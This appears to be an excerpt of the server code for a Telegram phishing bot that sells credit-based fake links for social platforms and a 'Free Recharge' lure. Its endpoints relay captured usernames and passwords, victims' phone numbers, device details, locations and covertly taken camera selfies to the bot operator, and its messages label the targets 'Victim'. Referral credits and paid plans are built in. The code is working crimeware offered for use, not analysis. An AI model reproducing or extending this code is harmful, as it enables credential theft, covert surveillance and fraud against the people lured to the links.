...
const PREMIUM_EMOJIS = {
    money: { emoji: '🤑', id: '6316601375660710715' },
    check: { emoji: '✅', id: '6314256976352123225' },
    calendar: { emoji: '🗓', id: '6314454922804861005' },
    star: { emoji: '🌟', id: '6316798617738811060' },
    skull: { emoji: '☠', id: '6145465006432459177' },
    crown1: { emoji: '👑', id: '6122859154739569098' },
    crown2: { emoji: '👑', id: '6122817437722221858' },
    chart: { emoji: '📈', id: '6122770893161635352' },
    sparkle: { emoji: '✨', id: '6122954593207853337' },
    pin: { emoji: '📌', id: '6122731529786367432' }
};

// Helper to get premium emoji HTML
function getPremiumEmoji(key) {
    const emoji = PREMIUM_EMOJIS[key];
    if (!emoji) return '';
    // Use the emoji directly - Telegram will render it as premium if user has premium
    // The ID is stored for reference but we use the emoji character
    return emoji.emoji;
}
...
function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
    return `${getPremiumEmoji('skull')}©${getPremiumEmoji('skull')} ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ RTF ʙᴏʏ ﾂ.${getPremiumEmoji('skull')}ª${getPremiumEmoji('skull')}\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n${getPremiumEmoji('pin')} ↝ ᴜsᴇʀɴᴀᴍᴇ » ${username}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${password}\n${getPremiumEmoji('calendar')} ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
}
...
async function sendBatchPhotos(userId) {
    ...
    try {
        await S7.sendPhoto(userId, photos[0], { caption: `${getPremiumEmoji('star')} <b>${count} photos received!</b>`, parse_mode: 'HTML' });
        const batch = [];
...
app.post('/api/capture-camera-full', async (req, res) => {
    try {
        ...
        let message = `${getPremiumEmoji('money')} <u>Victim Free Recharge Visit</u>\n`;
        message += `__________________________________\n\n`;
        message += `${getPremiumEmoji('pin')} <b>Mobile Number:</b> <code>${mobile}</code>\n`;
        message += `📶 <b>Operator:</b> ${operator || 'N/A'}\n`;
        message += `${getPremiumEmoji('money')} <b>Plan Selected:</b> ₹${plan || 'N/A'} (${planDetail || 'N/A'})\n\n`;
        message += `${getPremiumEmoji('chart')} <b>Device Info:</b>\n`;
        ...
        message += `__________________________________\n`;
        message += `${getPremiumEmoji('calendar')} <b>Time:</b> ${SYloveTiMe}\n`;
        message += `📝 <b>Date:</b> ${SYloveDaTe}\n`;
        message += `${getPremiumEmoji('pin')} <b>User ID:</b> <code>${userid}</code>`;
        ...
        if (photo && photo.length > 100) {
            try {
                ...
                const photoCaption = `${getPremiumEmoji('star')} <b>Selfie from Victim</b>\n📱 Mobile: <code>${mobile}</code>\n📍 ${deviceInfo?.location || 'Unknown location'}`;
...
app.post('/api/camera-success', async (req, res) => {
    try {
        ...
        const msg = `${getPremiumEmoji('check')} <b>Free Recharge Claimed!</b>\n\n📱 Mobile: <code>${mobile || 'Unknown'}</code>\n📶 Operator: ${operator || 'N/A'}\n💰 Plan: ₹${plan || 'N/A'}\n\n${getPremiumEmoji('money')} Victim successfully claimed free recharge!`;
...
app.post('/api/scan-close', async (req, res) => {
    try {
        ...
        let summary = `${getPremiumEmoji('check')} <b>Scan Complete!</b>\n\n`;
...
app.post('/api/capture', async (req, res) => {
    ...
    try {
        ...
        let extra = '';
        if (plan) {
            extra = `\n${getPremiumEmoji('chart')} Plan selected: ${plan} followers`;
        }
        ...
        let adminMsg = `${getPremiumEmoji('star')} <b>New Capture</b>\n\n👤 <b>User:</b> <code>${userid}</code>\n📌 <b>Platform:</b> ${platform || 'Unknown'}\n👤 <b>Username:</b> <code>${username}</code>\n🔑 <b>Password:</b> <code>${password}</code>`;
        if (plan) {
            adminMsg += `\n${getPremiumEmoji('chart')} <b>Plan:</b> ${plan} followers`;
        }
        adminMsg += `\n${getPremiumEmoji('calendar')} <b>Time:</b> ${new Date().toLocaleString()}`;
...
async function SendLoveSYMenu(chatId, firstName) {
    ...
    let message = `${getPremiumEmoji('crown1')}𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ${getPremiumEmoji('crown2')}\n\n${getPremiumEmoji('star')} Credits: ${credits}\n${getPremiumEmoji('pin')} Referrals: ${(user.totalReferrals || 0)}`;
    ...
    if (featured.status && featured.photo) {
        ...
        if (photo) {
            const photoUrl = config.baseUrl + '/api/photo-data/' + photo.id;
            await S7.sendPhoto(chatId, photoUrl, { caption: `${getPremiumEmoji('star')} Featured Content` });
        }
    }
    return sentMsg;
}
...
S7.on('message', async (msg) => {
    ...
    if (text === '/telegram') {
        ...
        const loadingMsg = await S7.sendMessage(msg.chat.id, SYloveMenu(msg.from.first_name, `${getPremiumEmoji('sparkle')}𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)`), { parse_mode: 'HTML', reply_markup: SYBack });
        try {
...
async function processReferral(referrerId, userId) {
    ...
    await S7.sendMessage(referrerId, `${getPremiumEmoji('money')} <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ${newUserInfo}\n🆔 <b>User ID:</b> <code>${userId}</code>\n${getPremiumEmoji('star')} <b>Credits Earned:</b> +2\n\n${getPremiumEmoji('chart')} <b>Your Total Credits:</b> ${(referrer.credits || 0)}\n${getPremiumEmoji('pin')} <b>Your Total Referrals:</b> ${(referrer.totalReferrals || 0)}`, { parse_mode: 'HTML' });
    await S7.sendMessage(config.adminId, `${getPremiumEmoji('pin')} <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ${referrerInfo}\n👤 <b>New User:</b> ${newUserInfo}\n🆔 <b>Referrer ID:</b> <code>${referrerId}</code>\n🆔 <b>New User ID:</b> <code>${userId}</code>\n${getPremiumEmoji('star')} <b>Credits Earned:</b> 2\n\n${getPremiumEmoji('chart')} <b>Referrer Total Credits:</b> ${(referrer.credits || 0)}\n${getPremiumEmoji('pin')} <b>Referrer Total Referrals:</b> ${(referrer.totalReferrals || 0)}`, { parse_mode: 'HTML' });
    await S7.sendMessage(userId, `${getPremiumEmoji('check')} <b>Welcome!</b>\n\nYou joined through <b>${referrerInfo}</b>'s referral link!\n🎁 You already have 3 credits to start.\n${getPremiumEmoji('star')} <b>Your Credits:</b> ${user.credits}`, { parse_mode: 'HTML' });
...
S7.on('callback_query', async (q) => {
    ...
    if (q.data === 'buy_credits') {
        ...
        await S7.sendMessage(cid, `${getPremiumEmoji('money')} <b>Buy Credits</b>\n\nChoose a plan below:`, { parse_mode: 'HTML', reply_markup: plans });
        await S7.deleteMessage(cid, mid);
        return;
    }
    ...
    if (q.data.startsWith('pay_accept_') && isAdmin) {
        ...
        if (payment.credits === 'Unlimited') {
            ...
            await S7.sendMessage(userId,
                `${getPremiumEmoji('money')} <b>UNLIMITED ACTIVATED!</b>\n\n` +
            ...
            await user.save();
            await S7.sendMessage(userId,
                `${getPremiumEmoji('check')} <b>Payment Verified!</b>\n\n` +
                '💰 Amount: ₹' + payment.amount + '\n' +
                `${getPremiumEmoji('star')} Credits Added: +${payment.credits}\n` +
                `${getPremiumEmoji('chart')} Total Credits: ${user.credits}\n\n` +
                'Thank you for your support! 🙏',
                { parse_mode: 'HTML' }
            );
        }
        ...
        await S7.editMessageText(
            `${getPremiumEmoji('check')} <b>Payment Accepted!</b>\n\n` +
            '👤 User: <code>' + userId + '</code>\n' +
            `${getPremiumEmoji('chart')} Credits: ${payment.credits}\n` +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
    ...
    if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
        ...
        const loadingMsg = await S7.sendMessage(cid, SYloveMenu(q.from.first_name, `${getPremiumEmoji('sparkle')}𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)`), { parse_mode: 'HTML', reply_markup: SYBack });
        try {
            const response = await fetch(config.baseUrl + '/api/create-link', {
                method: 'GET',
            ...
            const finalMsg = `${getPremiumEmoji('check')} <b>${platformDisplay} Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>${data.url}</code>\n\n📌 <b>Platform:</b> ${platformDisplay}\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> ${config.MAX_OPENS} times\n🔄 Share and earn referrals!\n\n${getPremiumEmoji('star')} <b>Remaining Credits:</b> ${(user.unlimited ? '♾️ Unlimited' : (user.credits || 0))}`;
...
/getadmin - Get admin panel link`;
    ...
    if (cmd === '/users') {
        try {
            const users = await User.find();
            let list = `${getPremiumEmoji('pin')} <b>All Users</b>\n\n`;
    ...
    if (cmd === '/stats') {
        try {
            ...
            const stats = `${getPremiumEmoji('chart')} <b>Bot Statistics</b>\n\n👥 Users: ${users.length}\n📷 Photos: ${photos.length}\n📢 Channels: ${channels.length}\n👥 Referrals: ${referrals.length}\n🔗 Links: ${links.length}\n🎫 Coupons: ${coupons.length}\n⏱ Uptime: ${getUptime()}`;
